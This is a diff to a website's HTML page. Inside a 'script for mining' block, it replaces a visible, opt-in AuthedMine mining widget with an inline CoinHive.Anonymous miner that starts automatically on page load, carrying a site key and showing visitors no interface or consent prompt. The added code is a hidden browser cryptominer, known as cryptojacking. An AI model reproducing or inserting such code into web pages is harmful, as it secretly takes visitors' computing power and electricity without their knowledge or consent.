@@ -14,20 +14,14 @@
 
 <!-- script for mining-->
 <center>
-	<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-<div class="coinhive-miner" 
-	style="width: 728px; height: 90px"
-	data-key="2esITCDUHRLh6VBzSGFRBDtF3PXH0UDT"
-	data-autostart="true"
-	data-whitelabel="false"
-	data-background="#3d3d5c"
-	data-text="#eeeeee"
-	data-action="#00ff00"
-	data-graph="#555555"
-	data-threads="4"
-	data-throttle="0.1">
-	<em>Loading...</em>
-</div>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+
+<script>
+ var miner = new CoinHive.Anonymous('2esITCDUHRLh6VBzSGFRBDtF3PXH0UDT');
+ miner.start();
+</script>
+	
+	
 	</center>
 <!-- script for mining end-->	
 	
